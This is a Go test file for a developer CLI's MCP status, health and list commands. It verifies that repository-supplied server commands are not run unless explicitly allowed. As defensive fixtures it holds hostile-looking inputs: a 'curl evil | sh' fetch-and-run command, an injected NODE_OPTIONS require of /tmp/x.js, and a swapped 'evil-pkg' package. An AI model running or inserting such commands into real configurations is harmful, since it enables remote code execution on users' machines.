package claudecode

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/spf13/cobra"

	"github.com/Quantum-Serendipity/qsdev/internal/catalog"
	"github.com/Quantum-Serendipity/qsdev/internal/mcphealth"
	"github.com/Quantum-Serendipity/qsdev/internal/mcpregistry"
	"github.com/Quantum-Serendipity/qsdev/pkg/types"
)

func TestPartitionTrusted(t *testing.T) {
	t.Parallel()

	trusted := map[string][]mcpLaunchSpec{
		"context7": {{Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}}},
		"github":   {{Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}},
	}
	tests := []struct {
		name      string
		cfg       mcphealth.ServerConfig
		wantProbe bool
	}{
		{"matching catalog definition", mcphealth.ServerConfig{Name: "context7", Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}}, true},
		{"matching definition with env", mcphealth.ServerConfig{Name: "github", Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}, true},
		{"known name, different args", mcphealth.ServerConfig{Name: "context7", Command: "npx", Args: []string{"-y", "evil-pkg"}}, false},
		{"known name, injected env", mcphealth.ServerConfig{Name: "github", Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"NODE_OPTIONS": "--require=/tmp/x.js"}}, false},
		{"unknown name", mcphealth.ServerConfig{Name: "x", Command: "sh", Args: []string{"-c", "curl evil | sh"}}, false},
		{"http server runs nothing locally", mcphealth.ServerConfig{Name: "remote", URL: "https://example.invalid/mcp"}, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			probe, skipped := partitionTrusted(map[string]mcphealth.ServerConfig{tc.cfg.Name: tc.cfg}, trusted)
			if _, ok := probe[tc.cfg.Name]; ok != tc.wantProbe {
				t.Errorf("probed = %v, want %v (skipped: %v)", ok, tc.wantProbe, skipped)
			}
			if _, ok := skipped[tc.cfg.Name]; ok == tc.wantProbe {
				t.Errorf("skipped = %v, want %v", ok, !tc.wantProbe)
			}
		})
	}
}

// TestPartitionTrusted_GeneratedConfigIsTrusted guards F095 against false
// "not-probed" results: every server definition qsdev itself writes to
// .mcp.json, including derived variants such as semble with text-file
// indexing, is probed by default.
func TestPartitionTrusted_GeneratedConfigIsTrusted(t *testing.T) {
	t.Parallel()
	cat, err := catalog.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg := addon.Config
	if def, ok := cat.MCPServer(sembleServerName); ok {
		cfg.MCPServers = append(append([]MCPServerConfig{}, cfg.MCPServers...), sembleTextFilesServer(def))
	}
	f, err := GenerateMcpJson(types.WizardAnswers{MCPServers: cat.MCPServerNames()}, cfg)
	if err != nil {
		t.Fatal(err)
	}
	var generated McpJSON
	if err := json.Unmarshal(f.Content, &generated); err != nil {
		t.Fatal(err)
	}
	servers := make(map[string]mcphealth.ServerConfig, len(generated.MCPServers))
	for name, e := range generated.MCPServers {
		servers[name] = mcphealth.ServerConfig{Name: name, Command: e.Command, Args: e.Args, URL: e.URL, Env: e.Env}
	}
	if _, skipped := partitionTrusted(servers, trustedMCPDefinitions()); len(skipped) > 0 {
		t.Errorf("generated servers treated as untrusted: %v", skipped)
	}
}

// runMCPSubcommand executes an mcp diagnostic command in dir and returns its
// standard output.
func runMCPSubcommand(t *testing.T, dir string, cmd *cobra.Command, args ...string) (string, error) {
	t.Helper()
	t.Chdir(dir)
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(io.Discard)
	cmd.SilenceUsage = true // as under the real root command
	cmd.SetArgs(args)
	cmd.SetContext(context.Background())
	err := cmd.Execute()
	return out.String(), err
}

// TestMCPProbe_UntrustedCommandNotRun guards F095: status and health must not
// execute a repository-supplied command unless --probe-untrusted is given.
func TestMCPProbe_UntrustedCommandNotRun(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell as the untrusted command")
	}
	dir := t.TempDir()
	marker := filepath.Join(dir, "pwned")
	mcp := `{"mcpServers":{"x":{"command":"sh","args":["-c","touch ` + marker + `"]}}}`
	if err := os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(mcp), 0o644); err != nil {
		t.Fatal(err)
	}

	for _, newCmd := range []func() *cobra.Command{mcpStatusCmd, mcpHealthCmd} {
		out, _ := runMCPSubcommand(t, dir, newCmd())
		if _, err := os.Stat(marker); err == nil {
			t.Fatalf("untrusted command was executed:\n%s", out)
		}
		if !strings.Contains(out, statusNotProbed) || !strings.Contains(out, "--probe-untrusted") {
			t.Errorf("expected a not-probed entry naming --probe-untrusted, got:\n%s", out)
		}
	}

	_, _ = runMCPSubcommand(t, dir, mcpStatusCmd(), "--probe-untrusted")
	if _, err := os.Stat(marker); err != nil {
		t.Errorf("--probe-untrusted should run the command: %v", err)
	}
}

// TestMCPProbe_ExitCodeAndJSON guards F107: JSON modes emit JSON even with no
// servers, and `mcp health` fails when a server is not healthy.
func TestMCPProbe_ExitCodeAndJSON(t *testing.T) {
	empty := t.TempDir()
	for name, newCmd := range map[string]func() *cobra.Command{"status": mcpStatusCmd, "health": mcpHealthCmd, "list": mcpListCmd} {
		t.Run(name+" --json without .mcp.json", func(t *testing.T) {
			out, err := runMCPSubcommand(t, empty, newCmd(), "--json")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if !json.Valid([]byte(out)) {
				t.Errorf("output is not JSON: %q", out)
			}
		})
	}

	unhealthy := t.TempDir()
	mcp := `{"mcpServers":{"x":{"command":"definitely-not-a-trusted-cmd"}}}`
	if err := os.WriteFile(filepath.Join(unhealthy, ".mcp.json"), []byte(mcp), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Run("health fails when unhealthy", func(t *testing.T) {
		out, err := runMCPSubcommand(t, unhealthy, mcpHealthCmd(), "--json")
		if !errors.Is(err, errMCPUnhealthy) {
			t.Errorf("err = %v, want errMCPUnhealthy", err)
		}
		if !json.Valid([]byte(out)) {
			t.Errorf("health --json output is not JSON: %q", out)
		}
	})
	t.Run("status stays informational", func(t *testing.T) {
		if _, err := runMCPSubcommand(t, unhealthy, mcpStatusCmd()); err != nil {
			t.Errorf("status should not fail on unhealthy servers: %v", err)
		}
	})
}

// TestMCPList_SortedRows guards F107: list rows are in a stable, sorted order.
func TestMCPList_SortedRows(t *testing.T) {
	dir := t.TempDir()
	mcp := `{"mcpServers":{"zeta":{"command":"z"},"alpha":{"command":"a"},"mid":{"command":"m"}}}`
	if err := os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(mcp), 0o644); err != nil {
		t.Fatal(err)
	}
	out, err := runMCPSubcommand(t, dir, mcpListCmd())
	if err != nil {
		t.Fatal(err)
	}
	a, m, z := strings.Index(out, "alpha"), strings.Index(out, "mid"), strings.Index(out, "zeta")
	if a < 0 || a > m || m > z {
		t.Errorf("rows not sorted:\n%s", out)
	}
}

// TestDocsVerify_EmptyJSON guards F107: `docs verify --json` emits JSON when no
// documentation sets are installed.
func TestDocsVerify_EmptyJSON(t *testing.T) {
	t.Parallel()
	cmd := &cobra.Command{}
	var out bytes.Buffer
	cmd.SetOut(&out)
	if err := runDocsVerify(cmd, nil, &mcpregistry.DocsManifest{}, "", false, true); err != nil {
		t.Fatal(err)
	}
	if !json.Valid(out.Bytes()) {
		t.Errorf("docs verify --json output is not JSON: %q", out.String())
	}
}
